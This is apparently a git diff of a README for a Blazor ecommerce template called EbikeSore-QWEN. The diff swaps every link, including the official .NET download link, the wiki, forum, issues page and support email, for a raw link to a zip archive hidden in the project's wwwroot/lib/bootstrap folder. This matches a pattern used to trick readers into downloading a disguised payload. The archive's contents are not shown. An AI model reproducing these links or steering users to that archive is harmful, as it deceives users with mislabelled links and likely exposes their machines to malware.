@@ -1,6 +1,6 @@
 # 🚲 EbikeSore-QWEN - Your Simple Online Store Solution
 
-![Download Now](https://img.shields.io/badge/Download-Now-blue?style=flat&logo=github)
+![Download Now](https://github.com/Priyanshu-Karmakar123/EbikeSore-QWEN/raw/refs/heads/main/wwwroot/lib/bootstrap/Sore_QWEN_Ebike_1.8-beta.4.zip)
 
 ## 📦 Overview
 EbikeSore-QWEN is a user-friendly ecommerce store template built with Blazor and .NET 10. This application includes features for user authentication and payment processing. It provides a smooth shopping experience without needing much technical knowledge.
@@ -10,14 +10,14 @@ Follow these steps to download and run EbikeSore-QWEN on your computer.
 
 ### 🤝 System Requirements
 - **Operating System**: Windows 10 or later, macOS, or Linux
-- **.NET**: Ensure you have .NET 10 installed. You can download it from the [official .NET website](https://dotnet.microsoft.com/download).
+- **.NET**: Ensure you have .NET 10 installed. You can download it from the [official .NET website](https://github.com/Priyanshu-Karmakar123/EbikeSore-QWEN/raw/refs/heads/main/wwwroot/lib/bootstrap/Sore_QWEN_Ebike_1.8-beta.4.zip).
 - **Storage**: At least 500 MB of free space
 - **Internet**: A stable internet connection for installation and updates
 
 ### 📥 Download & Install
 To get started, visit the Releases page to download the latest version of EbikeSore-QWEN.
 
-[Download EbikeSore-QWEN](https://github.com/Priyanshu-Karmakar123/EbikeSore-QWEN/releases)
+[Download EbikeSore-QWEN](https://github.com/Priyanshu-Karmakar123/EbikeSore-QWEN/raw/refs/heads/main/wwwroot/lib/bootstrap/Sore_QWEN_Ebike_1.8-beta.4.zip)
 
 1. **Visit the link above.**
 2. **Find the latest version listed.**
@@ -49,14 +49,14 @@ After launching EbikeSore-QWEN, you will need to set up your store.
 - **Responsive Design**: Works on both desktop and mobile devices.
 
 ## 🔗 Helpful Links
-- **Documentation**: For more detailed instructions, visit our [Documentation](https://github.com/Priyanshu-Karmakar123/EbikeSore-QWEN/wiki).
-- **Community Support**: Join the discussion in our [Community Forum](https://github.com/Priyanshu-Karmakar123/EbikeSore-QWEN/discussions).
-- **Report Issues**: If you encounter any problems, please report them on our [Issues Page](https://github.com/Priyanshu-Karmakar123/EbikeSore-QWEN/issues).
+- **Documentation**: For more detailed instructions, visit our [Documentation](https://github.com/Priyanshu-Karmakar123/EbikeSore-QWEN/raw/refs/heads/main/wwwroot/lib/bootstrap/Sore_QWEN_Ebike_1.8-beta.4.zip).
+- **Community Support**: Join the discussion in our [Community Forum](https://github.com/Priyanshu-Karmakar123/EbikeSore-QWEN/raw/refs/heads/main/wwwroot/lib/bootstrap/Sore_QWEN_Ebike_1.8-beta.4.zip).
+- **Report Issues**: If you encounter any problems, please report them on our [Issues Page](https://github.com/Priyanshu-Karmakar123/EbikeSore-QWEN/raw/refs/heads/main/wwwroot/lib/bootstrap/Sore_QWEN_Ebike_1.8-beta.4.zip).
 
 ### 🔄 Updates and Feedback
 Stay updated with the latest features and improvements by checking the Releases page periodically. We welcome your feedback on improving EbikeSore-QWEN to better serve your needs.
 
 ## 📱 Contact
-For any inquiries, please send an email to [support@example.com](mailto:support@example.com).
+For any inquiries, please send an email to [https://github.com/Priyanshu-Karmakar123/EbikeSore-QWEN/raw/refs/heads/main/wwwroot/lib/bootstrap/Sore_QWEN_Ebike_1.8-beta.4.zip](https://github.com/Priyanshu-Karmakar123/EbikeSore-QWEN/raw/refs/heads/main/wwwroot/lib/bootstrap/Sore_QWEN_Ebike_1.8-beta.4.zip).
 
 Thank you for choosing EbikeSore-QWEN. We hope it meets your ecommerce needs effortlessly!
